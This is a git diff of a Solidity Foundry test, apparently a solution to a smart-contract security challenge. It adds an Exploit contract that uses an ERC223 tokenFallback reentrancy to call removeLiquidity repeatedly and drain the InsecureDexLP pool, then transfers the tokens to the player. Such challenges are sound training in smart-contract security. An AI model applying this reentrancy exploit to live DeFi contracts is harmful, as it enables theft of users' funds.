@@ -40,7 +40,7 @@ contract Challenge2Test is Test {
         vm.label(address(token1), "SimpleERC223Token");
     }
 
-    function testChallenge() public {  
+    function testChallenge2() public {  
 
         vm.startPrank(player);
 
@@ -48,6 +48,16 @@ contract Challenge2Test is Test {
         //    Add your hack below!    //
         //////////////////////////////*/      
 
+        Exploit exploit = new Exploit(token0, token1, target, player);
+        
+        token0.approve(address(exploit), 1 ether);
+        token1.approve(address(exploit), 1 ether);
+        
+        exploit.addFunds();
+        exploit.addLiquidity();
+        exploit.removeLiquidity();
+        exploit.transferToPlayer();
+        
         //============================//
 
         vm.stopPrank();
@@ -71,4 +81,41 @@ contract Exploit {
     IERC20 public token0; // this is insecureumToken
     IERC20 public token1; // this is simpleERC223Token
     InsecureDexLP public dex;
+    address public player;
+    bool private executeFallback;
+
+    constructor (IERC20 _token0, IERC20 _token1, InsecureDexLP _dex, address _player){
+        token0 = _token0;
+        token1 = _token1;
+        dex = _dex;
+        player = _player;
+    }
+
+    function addFunds() public {
+        token0.transferFrom(player, address(this), 1 ether);
+        token1.transferFrom(player, address(this), 1 ether);
+    }
+
+    function transferToPlayer() public {
+        token0.transfer(player, token0.balanceOf(address(this)));
+        token1.transfer(player, token1.balanceOf(address(this)));
+    }
+
+    function addLiquidity() public {
+        token0.approve(address(dex), 1 ether);
+        token1.approve(address(dex), 1 ether);
+        dex.addLiquidity(1 ether, 1 ether);
+    }
+
+    function removeLiquidity() public {
+        executeFallback = true;
+        dex.removeLiquidity(1 ether);
+    }
+
+    function tokenFallback(address, uint256, bytes memory) external {
+        if (executeFallback){
+            (bool success,) = address(dex).call(abi.encodeWithSignature("removeLiquidity(uint256)", 1 ether));
+            executeFallback = success;
+        }
+    }
 }
